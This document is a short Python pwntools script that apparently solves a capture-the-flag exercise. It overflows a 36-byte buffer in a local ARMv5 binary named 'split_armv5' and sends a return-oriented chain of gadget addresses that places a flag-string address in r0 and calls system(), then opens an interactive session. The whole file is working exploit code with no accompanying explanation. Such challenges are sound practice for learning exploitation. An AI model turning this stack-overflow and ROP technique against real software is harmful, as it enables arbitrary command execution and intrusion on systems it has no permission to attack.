from pwn import *

r=process('./split_armv5')

r.recvuntil('> ')
flag= 0x0002103c
pop_r3_pc=0x000103a4
mov_r0_r3_pop_fp_pc=0x00010558
system=0x000105e0
payload='a'*36
payload+=p32(pop_r3_pc)
payload+=p32(flag)
payload+=p32(mov_r0_r3_pop_fp_pc)
payload+=p32(0)
payload+=p32(system)

#x=open('payload','w')
#x.write(payload)
#x.close()
r.sendline(payload)

r.interactive()
